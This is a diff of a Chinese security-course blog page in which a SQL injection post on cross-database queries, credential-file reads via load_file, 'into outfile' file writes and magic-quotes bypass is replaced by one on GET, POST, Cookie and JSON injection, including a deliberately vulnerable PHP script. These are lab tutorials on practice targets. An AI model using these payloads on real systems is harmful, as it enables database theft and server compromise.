@@ -18,24 +18,24 @@
   <meta name="author" content="阿荣">
   <meta name="keywords" content="">
   
-    <meta name="description" content="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）高权限注入及低权限注入高权限用户与数据库权限有绝对的关系，高权限的用户可以访问到除自己的数据库以外的其他数据库。这就是高权限注入（跨库注入）的原理。 跨库查询示例： 1234567891011网站A&#x3D;用户A&#x3D;数据库A表名  	列名		数据网站B&#x3D;用户B&#x3D;数据库B网站C&#x3D;用户C&#x3D;数据库C  sql-labs-less2 演示获取所有数据库名：">
+    <meta name="description" content="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）数据参数类型 数字型 演示案例：sqlilabs-less2  字符型 演示案例：sqlilabs-less1、3、4 less-1 less-3 ?id&#x3D;-1’) union select 1,2,3 –+ less-4 ?id&#x3D;-1”) union select 1,2,3 –+   注入提交方法GET,POST,C">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）">
-<meta property="og:url" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/index.html">
+<meta property="og:url" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/index.html">
 <meta property="og:site_name" content="AaR0n9">
-<meta property="og:description" content="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）高权限注入及低权限注入高权限用户与数据库权限有绝对的关系，高权限的用户可以访问到除自己的数据库以外的其他数据库。这就是高权限注入（跨库注入）的原理。 跨库查询示例： 1234567891011网站A&#x3D;用户A&#x3D;数据库A表名  	列名		数据网站B&#x3D;用户B&#x3D;数据库B网站C&#x3D;用户C&#x3D;数据库C  sql-labs-less2 演示获取所有数据库名：">
+<meta property="og:description" content="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）数据参数类型 数字型 演示案例：sqlilabs-less2  字符型 演示案例：sqlilabs-less1、3、4 less-1 less-3 ?id&#x3D;-1’) union select 1,2,3 –+ less-4 ?id&#x3D;-1”) union select 1,2,3 –+   注入提交方法GET,POST,C">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013085226422.png">
-<meta property="og:image" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013090152715.png">
-<meta property="og:image" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013101723977.png">
-<meta property="og:image" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013222601025.png">
-<meta property="og:image" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013194305805-1665670793410-2.png">
-<meta property="article:published_time" content="2022-10-13T14:15:38.265Z">
-<meta property="article:modified_time" content="2022-10-13T14:46:50.721Z">
+<meta property="og:image" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221018220311328.png">
+<meta property="og:image" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221019152825376.png">
+<meta property="og:image" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221019152932561.png">
+<meta property="og:image" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221019153020229.png">
+<meta property="og:image" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221017212346052.png">
+<meta property="article:published_time" content="2022-10-17T13:36:39.164Z">
+<meta property="article:modified_time" content="2022-10-19T07:30:44.806Z">
 <meta property="article:author" content="阿荣">
 <meta property="article:tag" content="信息安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://aarong365.github.io/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013085226422.png">
+<meta name="twitter:image" content="https://aarong365.github.io/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221018220311328.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -217,8 +217,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-13 22:15" pubdate>
-          2022年10月13日 晚上
+        <time datetime="2022-10-17 21:36" pubdate>
+          2022年10月17日 晚上
         </time>
       </span>
     
@@ -229,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          1.7k 字
         
       </span>
     
@@ -240,7 +240,7 @@
         
         
         
-          12 分钟
+          15 分钟
         
       </span>
     
@@ -283,59 +283,38 @@
             
               <div class="markdown-body">
                 
-                <h2 id="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）"><a href="#【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）" class="headerlink" title="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）"></a>【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</h2><h3 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h3><p>高权限用户与数据库权限有绝对的关系，高权限的用户可以访问到除自己的数据库以外的其他数据库。这就是高权限注入（跨库注入）的原理。</p>
-<p>跨库查询示例：</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs abnf">网站A<span class="hljs-operator">=</span>用户A<span class="hljs-operator">=</span>数据库A<br><br>表名<br><br>  	列名<br><br>		数据<br><br>网站B<span class="hljs-operator">=</span>用户B<span class="hljs-operator">=</span>数据库B<br><br>网站C<span class="hljs-operator">=</span>用户C<span class="hljs-operator">=</span>数据库C<br></code></pre></td></tr></table></figure>
-
-<h3 id="sql-labs-less2-演示"><a href="#sql-labs-less2-演示" class="headerlink" title="sql-labs-less2 演示"></a>sql-labs-less2 演示</h3><p>获取所有数据库名：</p>
-<p>information_schema下有一张记录系统所有数据库名的表schemata，可以通过查询schema_name字段查询到当前系统的所有数据库。</p>
-<img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013085226422.png" srcset="/img/loading.gif" lazyload class="" title="image-20221013085226422">
-
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-
-<p>获取指定 pikachu数据库名下的表名信息：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-comment">--+</span><br>httpinfo,member,message,users,xssblind<br></code></pre></td></tr></table></figure>
-
-<p>获取指定 pikachu下的表名users 下的列名信息：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;pikachu&#x27;</span><span class="hljs-comment">--+</span><br>id,username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">level</span><br></code></pre></td></tr></table></figure>
-
-<p>获取指定 pikachu 下的 users数据</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> pikachu.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br>Your <span class="hljs-keyword">Login</span> <span class="hljs-type">name</span>:<span class="hljs-keyword">admin</span><br>Your <span class="hljs-keyword">Password</span>:e10adc3949ba59abbe56e057f20f883e <br></code></pre></td></tr></table></figure>
-
-<img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013090152715.png" srcset="/img/loading.gif" lazyload class="" title="image-20221013090152715">
-
-<h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><ul>
-<li><p>load_file()：读取函数</p>
+                <h2 id="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）"><a href="#【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）" class="headerlink" title="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）"></a>【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）</h2><h3 id="数据参数类型"><a href="#数据参数类型" class="headerlink" title="数据参数类型"></a>数据参数类型</h3><ol>
+<li><p>数字型</p>
+<p>演示案例：sqlilabs-less2</p>
 </li>
-<li><p>into outfile 或 into dumpfile ：导出函数</p>
+<li><p>字符型</p>
+<p>演示案例：sqlilabs-less1、3、4</p>
+<p>less-1</p>
+<p>less-3</p>
+<p>?id&#x3D;-1’) union select 1,2,3 –+</p>
+<p>less-4</p>
+<p>?id&#x3D;-1”) union select 1,2,3 –+</p>
 </li>
-</ul>
-<h3 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h3><p>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</p>
-<h3 id="读取文件信息"><a href="#读取文件信息" class="headerlink" title="读取文件信息"></a>读取文件信息</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">union select <span class="hljs-number">1</span>,load<span class="hljs-constructor">_file(&#x27;D:\\<span class="hljs-params">phpstudy_pro</span>\\WWW\\<span class="hljs-params">sqli</span>-<span class="hljs-params">labs</span>-<span class="hljs-params">master</span>\\<span class="hljs-params">sql</span>-<span class="hljs-params">connections</span>\\<span class="hljs-params">db</span>-<span class="hljs-params">creds</span>.<span class="hljs-params">inc</span>&#x27;)</span>,<span class="hljs-number">3</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --+ <br></code></pre></td></tr></table></figure>
+</ol>
+<h3 id="注入提交方法"><a href="#注入提交方法" class="headerlink" title="注入提交方法"></a>注入提交方法</h3><p>GET,POST,COOKIE,REQUEST,HTTP 头等</p>
+<h3 id="POST-数据提交注入测试-x3D-gt-sqlilabs-less-11"><a href="#POST-数据提交注入测试-x3D-gt-sqlilabs-less-11" class="headerlink" title="POST 数据提交注入测试&#x3D;&gt;sqlilabs less 11"></a>POST 数据提交注入测试&#x3D;&gt;sqlilabs less 11</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">uname=admin&#x27; and 1=2 union select 1,2 #&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure>
 
-<img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013101723977.png" srcset="/img/loading.gif" lazyload class="">
+<img src="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/image-20221018220311328.png" srcset="/img/loading.gif" lazyload alt="image-20221018220311328" style="zoom:80%;" />
 
-<h3 id="写入文件信息"><a href="#写入文件信息" class="headerlink" title="写入文件信息"></a>写入文件信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> outfile &quot;D:\\x.php&quot; <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="COOKIE-数据提交注入测试-x3D-gt-sqlilabs-less-20"><a href="#COOKIE-数据提交注入测试-x3D-gt-sqlilabs-less-20" class="headerlink" title="COOKIE 数据提交注入测试&#x3D;&gt;sqlilabs less 20"></a>COOKIE 数据提交注入测试&#x3D;&gt;sqlilabs less 20</h3><p>首先抓取登录数据包：</p>
+<img src="/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221019152825376.png" srcset="/img/loading.gif" lazyload class="" title="image-20221019152825376">
 
-<h3 id="魔术引号及常见防护"><a href="#魔术引号及常见防护" class="headerlink" title="魔术引号及常见防护"></a>魔术引号及常见防护</h3><p>当magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。</p>
-<h3 id="如何绕过魔术引号？"><a href="#如何绕过魔术引号？" class="headerlink" title="如何绕过魔术引号？"></a>如何绕过魔术引号？</h3><p>把注入语句中的文件路径进行16进制编码，再写入into outfile函数里面注入。</p>
-<img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013222601025.png" srcset="/img/loading.gif" lazyload class="" title="image-20221013222601025">
-
-<h3 id="SQL语句过滤"><a href="#SQL语句过滤" class="headerlink" title="SQL语句过滤"></a>SQL语句过滤</h3><ul>
-<li><p>str_replace函数：str_replace(select,fuck,$id)</p>
-</li>
-<li><p>自带防御：魔术引号</p>
-</li>
-<li><p>内置函数：int等</p>
-</li>
-<li><p>自定义关键字：select等</p>
-</li>
-<li><p>WAF防护软件：安全狗，宝塔等</p>
-</li>
-</ul>
-<h3 id="WAF绕过简述"><a href="#WAF绕过简述" class="headerlink" title="WAF绕过简述"></a>WAF绕过简述</h3><img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013194305805-1665670793410-2.png" srcset="/img/loading.gif" lazyload class="">
+<p>再抓取GET请求数据包，添加Cookie字段：</p>
+<img src="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/image-20221019152932561.png" srcset="/img/loading.gif" lazyload alt="image-20221019152932561" style="zoom: 80%;" />
 
 
+
+<img src="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/image-20221019153020229.png" srcset="/img/loading.gif" lazyload alt="image-20221019153020229" style="zoom:80%;" />
+
+<h3 id="HTTP-头部参数数据注入测试-x3D-gt-sqlilabs-less-18"><a href="#HTTP-头部参数数据注入测试-x3D-gt-sqlilabs-less-18" class="headerlink" title="HTTP 头部参数数据注入测试&#x3D;&gt;sqlilabs less 18"></a>HTTP 头部参数数据注入测试&#x3D;&gt;sqlilabs less 18</h3><h3 id="参数-JSON-数据注入测试-x3D-gt-本地环境代码演示"><a href="#参数-JSON-数据注入测试-x3D-gt-本地环境代码演示" class="headerlink" title="参数 JSON 数据注入测试&#x3D;&gt;本地环境代码演示"></a>参数 JSON 数据注入测试&#x3D;&gt;本地环境代码演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#配合 sqlilabs 本地数据库演示</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;json&#x27;</span>]))&#123;<br><span class="hljs-variable">$json_str</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;json&#x27;</span>];<br><span class="hljs-variable">$json</span>=<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json_str</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$json</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;JSON 文档格式有误，请检查&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$json</span>-&gt;username;<br><span class="hljs-comment">//$passwd=$json-&gt;passwd;</span><br><span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>();<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$mysqli</span>-&gt;connect_errno)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;数据库连接失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">select_db</span>(<span class="hljs-string">&#x27;security&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$mysqli</span>-&gt;errno)&#123;<br><span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-string">&#x27;打开数据库失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error);<br>&#125;<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">set_charset</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;执行 SQL 语句失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;查询结果为空&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$array1</span>=<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名：<span class="hljs-subst">&#123;$array1[0][&#x27;username&#x27;]&#125;</span>,密码：<span class="hljs-subst">&#123;$array1[0][&#x27;password&#x27;]&#125;</span>&quot;</span>;<br>&#125;<br><span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">free</span>();<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>json&#x3D;{“username”:”Dumb’ and 1&#x3D;2 union select 1,database(),3#”}</p>
+<img src="/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221017212346052.png" srcset="/img/loading.gif" lazyload class="">
 
                 
               </div>
@@ -382,7 +361,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</div>
-      <div>https://aarong365.github.io/2022/10/13/【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）/</div>
+      <div>https://aarong365.github.io/2022/10/17/【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/</div>
     </div>
     <div class="license-meta">
       
@@ -394,7 +373,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年10月13日</div>
+          <div>2022年10月17日</div>
         </div>
       
       
@@ -426,18 +405,12 @@
                   <article class="post-prev col-6">
                     
                     
